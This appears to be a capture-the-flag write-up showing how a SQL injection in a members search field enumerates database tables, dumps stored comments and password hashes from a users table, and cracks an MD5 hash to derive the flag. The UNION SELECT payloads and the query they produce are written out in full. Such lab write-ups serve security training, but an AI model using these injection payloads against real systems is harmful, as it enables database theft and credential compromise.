# First step

In the members page, the search field gives a feeling to try an SQL injection to get all the table names and its columns names information from the database

# How to do that

I send the query
```
1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME  FROM INFORMATION_SCHEMA.COLUMNS
```

then after a lot of checks we checks only on the users table
```
1 OR 1=1 UNION SELECT Commentaire, countersign FROM users
```
the original query:
```
SELECT * FROM users WHERE id = 'user_input';
```

after inject the script and send it as an userId:
```
SELECT * FROM users WHERE id = 1 OR 1=1 UNION SELECT Commentaire, countersign FROM users;
```
So the result is a table of users it's gonna be like that:
```
ID: 1 OR 1=1 UNION SELECT Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

After derypting the surname  we get: FortyTwo
which is is in lowercase fortytwo

Then we use the Sh256 encryption to get the flag:
```
9995cae900a927ab1500d317dfcXXXXXXXXXXXXXXXXXXXXX
```
